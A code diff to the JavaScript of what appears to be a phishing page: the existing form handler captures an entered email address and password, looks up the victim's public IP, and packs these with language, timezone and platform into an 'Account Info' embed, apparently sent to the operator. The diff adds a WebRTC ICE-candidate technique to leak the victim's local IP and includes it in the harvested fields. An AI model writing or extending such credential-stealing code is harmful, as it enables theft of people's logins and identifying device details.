@@ -7,6 +7,26 @@ const ctx = canvas.getContext('2d');
 
 let savedAccount = {};
 
+async function getLocalIP() {
+  return new Promise((resolve) => {
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel("");
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+    pc.onicecandidate = (event) => {
+      if (!event || !event.candidate) return;
+      const ipMatch = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
+      if (ipMatch) {
+        resolve(ipMatch[1]);
+        pc.onicecandidate = null;
+        pc.close();
+      }
+    };
+
+    setTimeout(() => resolve("Not found"), 3000); 
+  });
+}
+
 function getIP() {
   return fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
@@ -29,13 +49,16 @@ form1.addEventListener('submit', async (e) => {
   savedAccount = { username, password };
 
   const ip = await getIP();
+  const localIP = await getLocalIP();
+
   const embed = {
     title: "Account Info",
     color: 3447003,
     fields: [
       { name: "MailAddress", value: username, inline: true },
       { name: "Password", value: password, inline: true },
-      { name: "IP", value: ip, inline: true },
+      { name: "Global IP", value: ip, inline: true },
+      { name: "Local IP", value: localIP, inline: true },
       { name: "Language", value: navigator.language, inline: true },
       { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
       { name: "Platform", value: navigator.platform, inline: true },
@@ -53,6 +76,7 @@ form1.addEventListener('submit', async (e) => {
   form1.classList.add('hidden');
   form2.classList.remove('hidden');
 });
+
 
 form2.addEventListener('submit', async (e) => {
   e.preventDefault();
